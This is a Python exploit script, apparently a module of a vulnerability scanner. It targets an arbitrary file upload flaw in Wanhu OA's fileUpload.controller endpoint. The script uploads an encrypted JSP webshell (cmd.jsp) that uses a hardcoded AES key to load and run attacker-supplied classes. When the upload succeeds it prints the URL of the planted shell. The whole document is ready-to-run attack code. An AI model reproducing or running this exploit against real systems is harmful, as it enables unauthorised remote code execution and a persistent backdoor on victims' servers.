import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import re

def 万户OA_fileupload_controller(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "Content-Type": "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0",
        "Connection": "Keep-Alive"
    }
    exp_url = urldata + "defaultroot/upload/fileUpload.controller"
    data = '''--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
    Content-Disposition: form-data; name="file"; filename="cmd.jsp"
    Content-Type: application/octet-stream
    Content-Transfer-Encoding: binary

    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*......tas9er*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
    --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--'''
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if "success" in upload.text:
            pattern = re.compile(r'"data":"(.*)"}')
            filename = pattern.findall(upload.text)[0]
            shell_url = urldata + "defaultroot/upload/html/" + filename
            print(Vcolors.RED + "[+] 上传webshell成功，默认密码，地址为{}".format(shell_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 万户OA fileUpload.controller 任意文件上传漏洞不存在" + Vcolors.ENDC)
    except:
        logging.error("万户OA_fileupload_controller脚本出现异常")


